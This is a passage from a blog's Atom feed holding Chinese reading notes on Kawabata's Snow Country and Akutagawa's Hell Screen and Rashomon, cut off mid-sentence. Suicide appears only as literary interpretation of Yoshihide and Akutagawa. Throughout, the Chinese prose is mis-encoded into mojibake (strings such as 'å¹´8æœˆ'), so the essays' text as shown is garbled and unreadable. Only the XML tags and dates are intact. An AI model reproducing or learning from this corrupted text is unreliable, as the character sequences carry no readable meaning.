    <content type="html"><![CDATA[<blockquote><p>2025å¹´8æœˆ13æ—¥ï¼ˆæ˜ŸæœŸä¸‰ï¼‰ (GMT+8) 14:29<br>â€œç©¿è¿‡å¿ç•Œé•¿é•¿çš„éš§é“ï¼Œåˆ—è½¦åˆ°è¾¾é›ªå›½ï¼Œå¤œå¹•ç¬¼ç½©ä¸‹ï¼Œä¸€åˆ‡éƒ½è¢«é›ªæŸ“æˆäº†ç™½è‰²ï¼Œåªæœ‰ä¸€ç‚¹å¾®å¾®çš„ç«å…‰â€<br>â€œé“¶æ²³ä»¿ä½›ä¸€ç‰‡å·¨å¤§çš„æå…‰ï¼Œä»è‡ªå·±èº«ä½“çš„èº«ä¸Šæµæ·Œè€Œå»ï¼Œå†·å½»å…¥éª¨çš„å­¤å¯‚ï¼Œåˆåƒæ˜¯æŸç§ç¾è‰³çš„æƒŠå¼‚ã€‚â€</p></blockquote><p>æ›´åƒæ˜¯ä¸€ç¯‡æœªå®Œæˆçš„æ‰‹è®°ï¼Œå¯¹äºæ™¯è‰²å’Œç¯å¢ƒçš„æå†™å¾ˆç¾å¾ˆç¾ï¼Œç¾åˆ°æˆ‘èººåœ¨åºŠä¸Šä¾ç„¶è„‘æµ·ä¾ç„¶èƒ½æµ®ç°å‡ºä¸€å¹•å¹•æˆç²¾ï¼Œé›ªï¼Œä»£è¡¨çº¯æ´æ— æš‡ï¼Œå°±åƒå·ç«¯åº·æˆç¬”ä¸‹çš„é©¹å­ä¸€æ ·ï¼Œâ€œçº¯æ´æ— æš‡â€ï¼Œè™½ç„¶æ˜¯ä¸€éƒ¨æ‹¿åˆ°äº†è¯ºè´å°”æ–‡å­¦å¥–çš„ä¹¦ï¼Œä½†æ˜¯æ›´æ„¿å½“åšä¸€éƒ¨æ™®é€šçš„çˆ±æƒ…å°è¯´æ¥é˜…è¯»ï¼Œä¸ä»…ä»…æ˜¯å› ä¸ºåœ¨é©¹å­çš„ä¸–ç•Œï¼Œè¿™æ®µç»å†æ˜¯çº¯æ´ç¾å¥½çš„ï¼Œæ˜¯å¥¹æ‰€å‘å¾€çš„ï¼Œä¹Ÿæ— å…³ä¹ä¸â€œå¾’åŠ³â€â€œç‰©å“€â€ï¼Œè€Œæ˜¯é©¹å­å®å®åœ¨åœ¨åŠªåŠ›çš„è¿‡ç¨‹ï¼Œå³ä½¿ç»“å±€æˆ–è®¸ä¸å¤ªå¦‚æ„ã€‚</p><p>æˆ–è®¸åœ¨æ—äººçœ‹æ¥é©¹å­ä¸ºæ•‘æ²»è¡Œç”·æ²¦ä¸ºè‰ºå¦“æ˜¯å¾’åŠ³ï¼Œå†™æ—¥è®°ã€ç»ƒä¸‰å¼¦æ˜¯å¾’åŠ³ï¼Œç”šè‡³çˆ±æƒ…äº¦æ˜¯å¾’åŠ³ï¼Œç”šè‡³åœ¨å²›æ‘å’Œå¶å­çœ‹æ¥éƒ½æ˜¯å¾’åŠ³ï¼Œå°±åƒç«å¯¹äºé›ªäº¦æ˜¯å¾’åŠ³ï¼Œä½†é©¹å­å¦‚â€œé›ªä¸­ç«â€èˆ¬çš„ç‚½çƒ­æŒ£æ‰ï¼Œæ°ä¸å²›æ‘çš„å†·æ¼ å½¢æˆåˆºç›®å¯¹æ¯”ï¼šå¥¹ä»¥é£è›¾æ‰‘ç«çš„å§¿æ€å¯¹æŠ—å‘½è¿ï¼Œå³ä¾¿ç»“å±€æ³¨å®šï¼Œä»ä»¥æ—¥è®°è®°å½•å­˜åœ¨ï¼Œä»¥ç´å£°å©é—®æ„ä¹‰ï¼Œä»¥è¿‡ç¨‹å¯¹æŠ—ç»“æœæˆ–è®¸æ›´æ˜¯ä½œè€…æƒ³ä»¥é©¹å­å‘Šè¯‰è¯»è€…çš„é“ç†ï¼Œæˆ–è®¸åœ¨å²›æ‘çœ‹æ¥é©¹å­æ˜¯å¾’åŠ³çš„ï¼Œæˆ–è®¸ä¸€å¼€å§‹å²›æ‘å°±ä»¥ä¸€ä¸ªæœ‰å®¶å®¤çš„ç”·äººæœ¬å°±åªæ˜¯æƒ³è„±ç¦»äºå¤–é¢çš„ä¸–ç•Œæ¥åˆ°é›ªå›½ï¼Œä½†æ˜¯å¯¹äºé©¹å­ä¸æ˜¯è¿™æ ·çš„ï¼Œæ˜çŸ¥å¯¹äºå²›æ‘è‡ªå·±æ˜¯â€œé£è›¾æ‰‘ç«â€ä½†æ˜¯ä»æ·±å¤œæ·±å¤œè¸é›ªèµ´çº¦ï¼Œå°†çˆ±æƒ…è§†ä¸ºâ€œé›ªä¸­ç«â€èˆ¬çš„ç”Ÿå­˜è¯æ˜ï¼Œæˆ–è®¸æ˜¯è·Ÿæ—¥æœ¬å½“æ—¶é‚£æ®µæ—¶é—´çš„å†å²æœ‰å…³ï¼Œä½†æ˜¯é©¹å­æ˜¯â€œå‹‡æ•¢â€çš„ã€‚</p><p>å²›æ‘ä¸æ˜¯å®Œæ•´çš„ï¼Œåªæ˜¯ä¸€éƒ¨åˆ†è¿›å…¥äº†é›ªå›½è¿™ä¸ªâ€œä¸ä¸–éš”ç»â€çš„ä¸–ç•Œï¼Œå°±åƒå²›æ‘ç ”ç©¶è¥¿æ´‹èˆè¹ˆå´åªé ä¹¦ç±æƒ³è±¡ï¼Œè¿·æ‹é©¹å­å´ç§°å…¶çˆ±æƒ…ä¸ºâ€œå¾’åŠ³â€â€”â€”æœ¬è´¨ä¸Šæ˜¯åœ¨ææƒ§çœŸå®çš„ç”Ÿå‘½çƒ­åº¦ï¼Œè€Œé©¹å­æ˜¯ç”Ÿå­˜åœ¨é›ªå›½ä¸­çš„ä¸€ä¸ªæ™®æ™®é€šé€šçš„â€œè‰ºä¼â€ä½†æ˜¯å´æ˜¯å¥¹æ˜¯é›ªå›½åœŸå£¤é‡Œé•¿å‡ºçš„ç”Ÿå‘½ï¼Œâ€œåè¦åœ¨è‘¬ç¤¼ä¸Šå¼¹ç´â€ï¼Œä¸€å¼€å§‹å°±æ³¨å®šç»“å±€æƒ¨çƒˆã€‚</p><p>å¾…å²›æ‘ç«™ç¨³è„šè·Ÿï¼ŒæŠ¬å¤´æœ›å»ï¼Œé“¶æ²³ä»¿ä½›å“—åœ°ä¸€å£°å‘å¿ƒåå€¾æ³»ã€‚</p><p><strong>å¾…å¿ƒä¸­é“¶æ²³å€¾æ³»è€Œä¸‹ï¼Œå³ä½¿èº«æ—çš„äººä¸æ˜¯å½¼æ­¤äº†ï¼Œä¹Ÿè¦å°†è¿‡å¾€æ·±æ·±å°å…¥è„‘æµ·ã€‚</strong></p>]]></content>
    
    
    <categories>
      
      <category>éšç¬”</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>åœ°ç‹±å˜</title>
    <link href="/2025/08/20/%E5%9C%B0%E7%8B%B1%E5%8F%98/"/>
    <url>/2025/08/20/%E5%9C%B0%E7%8B%B1%E5%8F%98/</url>
    
    <content type="html"><![CDATA[<p>èŠ¥å·é¾™ä¹‹ä»‹å†™çš„å°è¯´æˆ‘æ€»æ„Ÿè§‰å¾ˆâ€œå¯æ€•â€ï¼Œåœ¨é‡çœ‹ä¸€éè¿˜æ˜¯è§‰å¾—å¾ˆææ€–ï¼Œç»™æˆ‘ä¸€ç§ä¸å¯’è€Œæ —çš„æ„Ÿè§‰ï¼Œæˆ–è®¸è·Ÿä»–æœ¬äººçš„ç²¾ç¥çŠ¶æ€æœ‰å…³ï¼Œå‡ ä¹æ¯ç¯‡éƒ½ä¼šæ¶‰åŠé¬¼ç¥ã€åœ°ç‹±ç­‰å½¢è±¡ï¼Œå°±åƒè¿™ç¯‡å°è¯´åœ°ç‹±å˜ä¸€æ ·</p><p>ä¸€ä¸ªå­¤é«˜å¤æ€ªçš„å¤©æ‰ç”»å¸ˆè‰¯ç§€ï¼Œâ€œå¤©æ‰åœ¨å·¦ç–¯å­åœ¨å³â€ï¼Œè‰¯ç§€å°±æ˜¯è¿™æ ·ä¸€ä¸ªâ€œå¤©æ‰ç–¯å­â€ã€‚ä¸ºæç»˜åœ°ç‹±çƒˆç«ç„šè½¦çš„æè‡´æ™¯è±¡ï¼Œä¸æƒœä»¥çˆ±å¥³çš„ç”Ÿå‘½ä¸ºç¥­ï¼Œæœ€ç»ˆåœ¨å®ŒæˆæƒŠä¸–å±é£åè‡ªç¼¢èº«äº¡ã€‚</p><p>é€šç¯‡ä»¥å¤§é‡çš„ç¯‡å¹…å¥ å®šæ€§æ ¼åŸºç¡€ï¼Œä»å„ä¸ªæ–¹é¢æç»˜å‡ºäº†è‰¯ç§€çš„æ€§æ ¼ï¼Œå†·é…·ã€å‚²æ…¢ã€æ€§æ ¼å­¤åƒ»ã€ç—…æ€çš„å¯¹è‰ºæœ¯çš„ç‹‚çƒ­ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸€ä¸ªè‰ºæœ¯è€Œç‡ƒçƒ§çµé­‚çš„å¤©æ‰ã€‚ä»–è§†è‰ºæœ¯ä¸ºæœ€é«˜ä»·å€¼ï¼Œç”šè‡³è¶…è¶Šç”Ÿå‘½ä¸äººä¼¦ã€‚ä¸ºäº†æ•æ‰â€œçœŸå®â€ï¼Œä»–ä¸æƒœé‡‡ç”¨æç«¯æ‰‹æ®µï¼šè®©å¼Ÿå­èº«ç¼šé”é“¾è¢«æ€ªé¸Ÿå•„é£Ÿæ¥è§‚å¯Ÿå¼Ÿå­çš„ç—›è‹¦è¡¨æƒ…ï¼Œåœ¨è…çƒ‚å°¸ä½“æ—å†™ç”Ÿæ¥æç»˜æ­»äº¡æ°”æ¯ï¼Œç”šè‡³è¦æ±‚é‡ç°è´µå¦‡åœ¨çƒˆç«ä¸­ç„šèº«çš„æ™¯è±¡ã€‚è¿™ç§å¯¹è‰ºæœ¯â€œçœŸå®æ„Ÿâ€çš„ç—…æ€æ‰§ç€ï¼Œæ˜¯ä»–æ€§æ ¼ä¸­æœ€æ˜¾è‘—ä¹Ÿæœ€éª‡äººçš„ç‰¹è´¨ã€‚ä¹Ÿæ˜¯å› ä¸ºæœ‰è¿™æ ·ææ€–çš„æ€§æ ¼ï¼Œæ‰æœ‰äº†æœ€åç‰ºç‰²å¥³å„¿æ¥é€ å°±æƒŠä¸–å±é£çš„æ‚²å‰§ã€‚</p><p>æˆ‘æœ€ç›´æ¥æ„Ÿå—åˆ°çš„è‰¯ç§€æ€§æ ¼ä¸­æœ€æ ¸å¿ƒçš„æ‚²å‰§æ€§çŸ›ç›¾åœ¨äºï¼šä»–æœ€æ·±çˆ±çš„å¥³å„¿ï¼Œæœ€ç»ˆæˆä¸ºäº†ä»–è‰ºæœ¯è¿½æ±‚æœ€é«˜ç›®æ ‡çš„ç‰ºç‰²å“ã€‚ä»–å¹¶æœªä¸»åŠ¨è¦æ±‚ç‰ºç‰²å¥³å„¿ï¼Œä½†å½“å¤§å…¬â€œæˆå…¨â€ä»–çš„è‰ºæœ¯è¯·æ±‚ï¼Œå°†å¥³å„¿æŠ•å…¥ç«æµ·æ—¶ï¼Œä»–ä½œä¸ºçˆ¶äº²çš„æœ¬èƒ½ä¸ä½œä¸ºè‰ºæœ¯å®¶çš„æœ¬èƒ½å‘ç”Ÿäº†æƒ¨çƒˆçš„æ’•è£‚ï¼Œæ˜¯æˆ‘é‚£ä¸€ç¬é—´ä»èŠ¥å·é¾™ä¹‹ä»‹æ–‡å­—ä¸­æ·±åˆ»ä½“ä¼šåˆ°çš„ï¼Œæ–‡ä¸­å†™åˆ°ï¼š</p><blockquote><p>â€œè‰¯ç§€é‚£æ—¶çš„è„¸è‰²ï¼Œæˆ‘è‡³ä»Šéƒ½ä¸èƒ½å¿˜è®°ã€‚å½“ä»–èŒ«ç„¶åœ°å‘è½¦å­å¥”å»æ—¶ï¼Œå¿½ç„¶çœ‹åˆ°ç«ç„°å‡èµ·ï¼Œè„šæ­¥ç«‹åˆ»åœäº†ä¸‹æ¥ï¼Œä¸¤è‡‚ä¾ç„¶ä¼¸å‘å‰é¢ï¼Œçœ¼ç›å¥½åƒè¦æŠŠå½“å‰çš„æœ€è±¡å…¨éƒ¨åè¿›å»ä¼¼çš„ï¼Œç´§ç´§æ³¨è§†ç€åŒ…å·åœ¨ç«ç„°ä¸­çš„è½¦å­ï¼Œè‰¯ç§€çš„å…¨èº«æ˜ åœ¨çº¢çº¢çš„ç«å…‰ä¸­ï¼Œè¿èƒ¡å­æ¥‚å„¿éƒ½çœ‹å¾—æ¸…æ¥šã€‚çåœ†çš„çœ¼ï¼Œå› ææƒ§è€Œæ­ªæ–œçš„å˜´å’Œç‘Ÿç‘Ÿå‘æŠ–çš„è„¸ä¸Šçš„è‚Œè‚‰ï¼Œæ¸…æ¸…æ¥šæ¥šåœ°æ˜¾å‡ºäº†ä»–è„¸ä¸Šçš„ææ€–ã€æ‚²å“€ã€æƒŠæ…Œã€‚å³ä½¿åœ¨åˆ‘åœºä¸Šè¦è¢«ç å¤´çš„å¼ºç›—ï¼Œå³ä½¿æ˜¯æ‹‰ä¸Šé˜ç‹æ®¿çš„åæ¶ä¸èµ¦çš„å¼ºç›—é­‚ï¼Œä¹Ÿä¸ä¼šæœ‰è¿™æ ·å“äººçš„é¢œè‰²ã€‚â€</p></blockquote><p>å¯¹äºè‰ºæœ¯çš„è¿½æ±‚å’Œå¯¹äºå¥³å„¿æ·±æ²‰çš„çˆ±é‚£ä¸€ç¬é—´çš„ç¢°æ’ï¼Œæˆ–è®¸æ˜¯å¯¼è‡´è‰¯ç§€å®Œæˆåè‡ªç¼¢çš„æœ€ç›´æ¥åŸå› ã€‚è‰¯ç§€çš„è‡ªæ€æ˜¯å…¶æ€§æ ¼é€»è¾‘å‘å±•çš„å¿…ç„¶ç»“æœã€‚ä»–æ¯•ç”Ÿè¿½æ±‚è‰ºæœ¯æè‡´ï¼Œä¸ºæ­¤ä¸æƒœä¸€åˆ‡ä»£ä»·ï¼Œæœ€ç»ˆä»£ä»·å´æ˜¯ä»–æœ€çè§†çš„äººæ€§å’Œäº²æƒ…ã€‚å½“ä»–æ„è¯†åˆ°è‡ªå·±ä¸ºäº†è‰ºæœ¯ç«Ÿèƒ½â€œæ¬£èµâ€å¥³å„¿æƒ¨æ­»çš„æ™¯è±¡æ—¶ï¼Œæˆ‘æƒ³ä»–åº”è¯¥æ— æ³•å†ä¸è¿™æ ·çš„è‡ªå·±å…±å­˜ï¼Œä¹Ÿå¯¹äºè‡ªèº«æ˜¯å¦è¿˜æœ‰å­˜åœ¨äºä¸–ä¸Šçš„å¿…è¦äº§ç”Ÿäº†ç–‘é—®ã€‚</p><p>å…¶å®åˆå°ä¸æ˜¯èŠ¥å·é¾™ä¹‹ä»‹å¯¹äºè‡ªå·±çš„è§£æ„ï¼ŒåŒè‰¯ç§€ä¸€æ ·ï¼Œå¯¹äºæ–‡å­¦çš„è¿‘ä¹ç—…æ€çš„æ‰§ç€ï¼Œæ‰€å†™æ–‡å­—å‡æ˜¯åœ¨å±•ç¤ºç¤¾ä¼šç°è±¡å’Œäººæ€§ä¸‘é™‹ï¼Œä½œå“æ— ä¸å±•ç°äº†ä»–å¯¹äººæ€§å¹½æš—æ·±æ¸Šçš„å‡è§†ï¼Œä¸è‰¯ç§€ä¸ºæ•æ‰åœ°ç‹±çƒˆç„°çš„çœŸå®æ„Ÿè€Œè§‚å¯ŸçŒ´å­è¢«æŠ˜ç£¨ï¼Œç›´è‡³æœ€ç»ˆç›®ç¹å¥³å„¿åœ¨çƒˆç«ä¸­ç„šèº«çš„â€œè‰ºæœ¯è§‚å¯Ÿâ€å¼‚æ›²åŒå·¥</p><p>å €å·å¤§å…¬åœ¨ã€Šåœ°ç‹±å˜ã€‹ä¸­è±¡å¾ç€ç»å¯¹æƒåŠ›å¯¹ä¸ªä½“åŒ…æ‹¬è‰¯ç§€è¿™ç§å¤©æ‰çš„å†·é…·ç¢¾å‹ã€‚èŠ¥å·è™½æœªç›´æ¥æ­»äºæƒåŠ›ä¹‹æ‰‹ï¼Œä½†ä»–æ‰€èº«å¤„çš„æ—¶ä»£â€”â€”è¡¨é¢æ°‘ä¸»ç¹è£çš„å¤§æ­£æ—¶ä»£ï¼Œå†…é‡Œå´æ¶ŒåŠ¨ç€ä¼ ç»Ÿä»·å€¼å´©å¡Œã€ç¤¾ä¼šä¸å…¬åŠ å‰§ã€å†›å›½ä¸»ä¹‰æŠ¬å¤´çš„æš—æµâ€”â€”åŒæ ·æ„æˆäº†å·¨å¤§çš„ç²¾ç¥å‹è¿«ã€‚å¯¹æ‰€å¤„ä¸–ç•Œçš„çª’æ¯æ„Ÿä¸æ— åŠ›æ„Ÿï¼Œä¸è‰¯ç§€èº«å¤„å¤§å…¬å¼ºæƒä¹‹ä¸‹ï¼Œçºµç„¶æ‰åç»ä¸–å´æ— æ³•æŒæ§è‡ªèº«å‘½è¿çš„ç»æœ›ï¼Œåœ¨ç²¾ç¥å±‚é¢å½¢æˆäº†æ·±åˆ»çš„å…±é¸£ã€‚ä»–ä»¬éƒ½æ¸…é†’åœ°è®¤è¯†åˆ°è‡ªå·±èº«å¤„ä¸€ä¸ªä»¤äººçª’æ¯çš„ç»“æ„ä¹‹ä¸­å´æ— æ³•è‡ªæ‹”ã€‚</p><p>åŒæ ·è‰¯ç§€æœ€åçš„è‡ªç¼¢ï¼Œæ˜¯ç›®ç¹å¥³å„¿æƒ¨æ­»çš„ç²¾ç¥å´©æºƒï¼Œä¹Ÿæ˜¯å¯¹è‡ªèº«åœ¨è‰ºæœ¯ç‹‚çƒ­ä¸­æš´éœ²å‡ºçš„â€œéäººæ€§â€ä¸€é¢çš„ç»ˆæç»æœ›ä¸è‡ªæˆ‘æƒ©ç½šã€‚èŠ¥å·é¾™ä¹‹ä»‹åœ¨1927å¹´ï¼ŒåŒæ ·ä»¥è‡ªæ€çš„æ–¹å¼ç»“æŸäº†è‡ªå·±35å²çš„ç”Ÿå‘½ã€‚æˆ‘æƒ³ä»–çš„è‡ªæ€ï¼Œæ˜¯é•¿æœŸç²¾ç¥è‹¦æ–—çš„æœ€ç»ˆæºƒè´¥ï¼Œä¹Ÿæ˜¯å¯¹ä»–æ‰€çœ‹è§çš„é‚£ä¸ªå……æ»¡â€œåˆ©å·±ä¸»ä¹‰â€å’Œâ€œåœ°ç‹±æ™¯è±¡â€çš„ä¸–ç•Œçš„å½»åº•æ”¾å¼ƒã€‚è‰¯ç§€çš„åœ°ç‹±å˜å±é£ï¼Œä»¥å¥³å„¿çš„ç”Ÿå‘½ä¸ºé¢œæ–™ï¼›èŠ¥å·é‚£äº›å‰–æäººæ€§è‡³æš—çš„æ–‡å­¦åˆ›ä½œï¼Œåˆ™æ˜¯ä»¥ä»–é¥±å—ç…ç†¬çš„çµé­‚ä¸ºç¬”ï¼Œä»¥ä»–å¯¹ä¸–ç•Œæ·±åˆ»çš„ç»æœ›ä¸ºçº¸ã€‚æˆ–è®¸å½“ä»–å¿ƒä¸­é‚£å¹…æç»˜äººæ€§åœ°ç‹±çš„å·¨ä½œå®Œæˆåï¼Œä»–ä¹Ÿå¦‚è‰¯ç§€èˆ¬ï¼Œæ— æ³•ä¸è¿™ä¸ªâ€œåœ°ç‹±æ™¯è±¡â€çš„ä¸–ç•Œå…±å­˜ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>éšç¬”</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç½—ç”Ÿé—¨</title>
    <link href="/2025/08/20/%E7%BD%97%E7%94%9F%E9%97%A8/"/>
    <url>/2025/08/20/%E7%BD%97%E7%94%9F%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>ç½—ç”Ÿé—¨å†™äºæ—¥æœ¬å¤§æ­£å››å¹´ä¹æœˆè¿™ä¸ªæ—¶æœŸç±»ä¼¼äºå›½å†…çš„æ°‘å›½åˆæœŸï¼Œä¹Ÿå°±æ˜¯åŒ—æ´‹æ”¿åºœæ—¶æœŸï¼Œä¹Ÿå°±æ¯”è¾ƒå¥½ç†è§£äº†ã€‚</strong></p><blockquote><p>å¤§æ­£æ—¶ä»£ä»¥1912å¹´çš„â€œå¤§æ­£æ”¿å˜â€ï¼ˆç¬¬ä¸€æ¬¡æŠ¤å®ªè¿åŠ¨ï¼‰ä¸ºå¼€ç«¯ï¼Œæˆ‘ç™¾åº¦äº†ä¸€ä¸‹ç›¸å…³çš„å†å²ï¼Œå…¶å®åˆšå¥½å¤„äºæ–°æ—§äº¤æ›¿çš„å†å²æµªæ½®ä¸­ï¼Œå—åˆ°è¥¿æ–¹è‡ªç”±ä¸»ä¹‰ã€æ°‘ä¸»ä¸»ä¹‰ã€ç¤¾ä¼šä¸»ä¹‰ã€æ— æ”¿åºœä¸»ä¹‰ç­‰æ€æ½®çš„å¼ºçƒˆå†²å‡»ã€‚ã€‚æ°‘ä¼—ï¼ˆå°¤å…¶æ˜¯åŸå¸‚ä¸­äº§é˜¶çº§å’ŒçŸ¥è¯†åˆ†å­ï¼‰çš„å…¬æ°‘æ„è¯†è§‰é†’ï¼Œè¦æ±‚æ‰©å¤§æ™®é€‰æƒï¼ˆ1925å¹´å®ç°ç”·å­æ™®é€‰ï¼‰ã€æ”¹å–„åŠ³å·¥å¾…é‡ã€äº‰å–å¦‡å¥³æƒåˆ©ç­‰ï¼ŒåŒæ—¶è¥¿æ–¹æ€æƒ³çš„æ¶Œå…¥çŒ›çƒˆå†²å‡»ç€ä»¥å„’å®¶ä¼¦ç†å’Œå®¶æ—åˆ¶åº¦ä¸ºæ ¸å¿ƒçš„æ—¥æœ¬ä¼ ç»Ÿä»·å€¼è§‚ã€‚ä¸ªäººä¸»ä¹‰ä¸é›†ä½“ä¸»ä¹‰ã€è‡ªç”±æ‹çˆ±ä¸å®¶æ—åŒ…åŠå©šå§»ã€æ–°é“å¾·ä¸æ—§ä¼¦ç†ä¹‹é—´äº§ç”Ÿäº†æ¿€çƒˆçš„å†²çªå’Œæ··ä¹±ã€‚è®¸å¤šäººæ„Ÿåˆ°ç²¾ç¥ä¸Šçš„è¿·å¤±å’Œæ— æ‰€é€‚ä»ï¼Œæ—§ç§©åºå´©å¡Œä½†æ–°ç§©åºå¹¶æœªå»ºç«‹å®Œå…¨ï¼Œå¯¼è‡´ç¤¾ä¼šå‡ºç°å„ç§æ··ä¹±ï¼Œæ¯”å¦‚æˆ‘ç¿»åˆ°çš„1918å¹´çš„â€œç±³éªšåŠ¨â€ç­‰æ··ä¹±äº‹ä»¶</p></blockquote><p>å¼€ç¯‡æåˆ°çš„ç ´è´¥ã€é˜´æ£®ã€å¤±å»åŸæœ‰åŠŸèƒ½çš„ç½—ç”Ÿé—¨ï¼Œæ›¾æ˜¯å¨ä¸¥ã€ç§©åºã€åº‡æŠ¤çš„è±¡å¾ï¼Œå¦‚ä»Šæ²¦ä¸ºå°¸ä½“å †ç§¯ã€ç›—è´¼æ¨ªè¡Œçš„åœºæ‰€ï¼Œæ­£æ˜¯å¤§æ­£æ—¶ä»£ä¼ ç»Ÿä»·å€¼åœ¨è¥¿æ–¹æ€æ½®å†²å‡»ä¸‹çš„å´©å¡Œã€‚çœ‹ä¼¼è¡¨é¢ä¸Šæ˜¯æ°‘ä¸»ã€è¥¿åŒ–ã€ç¹è£çš„â€œæ–°æ—¶ä»£â€ï¼Œä½†æ—§ç§©åºå·²ç»å®Œå…¨å´©å¡Œï¼Œæ–°çš„ã€ç¨³å›ºçš„ç§©åºå°šæœªå®Œå…¨å»ºç«‹ï¼Œç¤¾ä¼šå¤„äºä¸€ç§ä»·å€¼çœŸç©ºå’Œé“å¾·å¤±èŒƒçš„æ··ä¹±çŠ¶æ€ã€‚åŸé—¨ä¸‹çš„é˜´æš—è§’è½ï¼Œæ±‡èšäº†è´«å›°ã€æ­»äº¡ã€ç½ªæ¶ï¼Œéšå–»å¤§æ­£â€œæ°‘ä¸»ç¹è£â€è¡¨è±¡ä¸‹è¢«æ©ç›–çš„ç¤¾ä¼šä¸å…¬ã€åº•å±‚è‹¦éš¾ä¸äººæ€§çš„é˜´æš—ï¼Œæ•´ä¸ªç¤¾ä¼šå¤„äºåŠ¨è¡æ··ä¹±å½“ä¸­ã€‚</p><p>åœ¨ç»æµè§æ¡åŠ¨è¡ä¸å®‰çš„ç¤¾ä¼šå¤§ç¯å¢ƒä¸­ï¼Œä»†äººå’Œè€å¦‡ç­‰æ™®é€šäººéƒ½é¢ä¸´ç€æç«¯çš„ç”Ÿå­˜å›°å¢ƒï¼Œå¤±ä¸šã€é¥¿æ­»ã€‚åœ¨â€œé¥¿æ­»â€è¿˜æ˜¯â€œä½œæ¶â€çš„é€‰æ‹©é¢å‰ï¼Œå–„æ¶è§‚å°±æ˜¾å¾—è‹ç™½æ— åŠ›ï¼ŒæŒ£æ‰æ±‚ç”Ÿçš„åº•å±‚æ°‘ä¼—æ˜¯åˆ«æ— é€‰æ‹©çš„ï¼Œä¹Ÿæ˜ å°„äº†å¤§æ­£æ—¶ä»£åº•å±‚æ°‘ä¼—åœ¨å¿«é€Ÿç°ä»£åŒ–å’Œç¤¾ä¼šåˆ†åŒ–ä¸­çš„æŒ£æ‰ï¼Œç¤¾ä¼šå¿«é€Ÿçš„å˜åŠ¨å¸¦æ¥çš„åº•å±‚äººæ°‘çš„ç—›è‹¦ã€‚è€å¦‡ä¸ºè‡ªå·±çš„â€œä½œæ¶â€è¡Œä¸ºè¾©æŠ¤ï¼Œä»†äººä¹Ÿä»¥æ­¤ä¸ºè‡ªå·±æŠ¢å¤ºå¼€è„±ï¼ˆâ€œæˆ‘ä¸æŠ¢ä½ ï¼Œæˆ‘ä¹Ÿä¼šé¥¿æ­»â€ï¼‰ï¼Œè¿™ç§â€œæ¶çš„è¿é”â€å’Œé“å¾·ç›¸å¯¹ä¸»ä¹‰çš„é€»è¾‘ï¼Œä¹Ÿæ­ç¤ºäº†åœ¨ä¼ ç»Ÿä»·å€¼å´©å¡Œã€ç¤¾ä¼šå‹åŠ›å·¨å¤§çš„ç¯å¢ƒä¸‹ï¼Œä¸ªä½“å¦‚ä½•è½»æ˜“åœ°æ‰¾åˆ°å€Ÿå£æ¥åˆç†åŒ–è‡ªå·±çš„å‘åŠ£è¡Œä¸ºï¼Œæ”¾å¼ƒé“å¾·åšå®ˆï¼Œæ½œæ„è¯†é‡Œä½œè€…æˆ–è®¸æƒ³è¯´çš„æ˜¯å¤§æ­£æ—¶ä»£æ—¥æœ¬çŸ¥è¯†åˆ†å­å¯¹ç¤¾ä¼šè¾¾å°”æ–‡ä¸»ä¹‰ã€åˆ©å·±ä¸»ä¹‰çš„æ¨å´‡ä»¥åŠä½œè€…å¯¹äºè¿™ç§ç°è±¡è”“å»¶çš„å¿§è™‘ã€‚</p><p>åŒæ—¶ä»†äººæœ€ç»ˆä»äººå˜ä¸ºé¬¼ï¼Œä¹Ÿä»£æŒ‡ç€æç«¯ç¯å¢ƒä¸‹äººæ€§å‘å…½æ€§å³æœ€åŸå§‹çš„ç”Ÿå­˜æœ¬èƒ½çš„é€€åŒ–ï¼Œä¹Ÿæ˜¯èŠ¥å·é¾™ä¹‹ä»‹å¯¹å¤§æ­£æ—¶ä»£ç››è¡Œçš„ç‰©è´¨ä¸»ä¹‰ã€åˆ©å·±ä¸»ä¹‰è”“å»¶å¯¼è‡´äººæ€§ä»â€œäººå˜ä¸ºé¬¼â€å¼‚åŒ–çš„è­¦ç¤ºã€‚</p><p>èŠ¥å·é¾™ä¹‹ä»‹æ–‡ä¸­å†™åˆ°çš„è€å¦‡æ‹”å–å¥³å°¸å¤´å‘åˆ¶ä½œå‡å‘è°‹ç”Ÿï¼ŒåŸæœ¬äºµæ¸å°¸ä½“çš„è¡Œä¸ºï¼Œä½†æ˜¯åœ¨æç«¯è´«å›°çš„ç¯å¢ƒä¸­ï¼Œç”Ÿå­˜éœ€æ±‚è¿«ä½¿äººä»¬è·µè¸æœ€åŸºæœ¬çš„é“å¾·åº•çº¿å³å¯¹æ­»è€…çš„ä¸å°Šé‡ï¼Œæ›´åŠ è¯´æ˜åœ¨é‚£ä¸ªå¹´ä»£çš„ç¤¾ä¼šåŠ¨è¡å’Œæ··ä¹±ã€‚åŒæ—¶å†™åˆ°çš„è€å¦‡ç”¨â€œå¥³å°¸ç”Ÿå‰ä¹Ÿä½œæ¶ï¼ˆå–å‡é±¼å¹²ï¼‰â€ä¸ºè‡ªå·±è¾©æŠ¤ï¼Œç”¨å¥³å°¸ç”Ÿå‰ä¹Ÿä½œæ¶æ¥ä¸ºè‡ªå·±çš„æ¶æ€§å¼€è„±ä»¥åŠåˆç†åŒ–è‡ªå·±çš„æ¶è¡Œï¼Œåœ¨ä»·å€¼æ··ä¹±æ—¶ä»£ï¼Œä¸ªä½“å¦‚ä½•é€šè¿‡æŒ‡è´£ä»–äººçš„â€œæ¶â€æ¥åˆç†åŒ–è‡ªå·±çš„å‘åŠ£è¡Œå¾„ï¼Œå½¢æˆâ€œæ¶â€çš„ä¼ 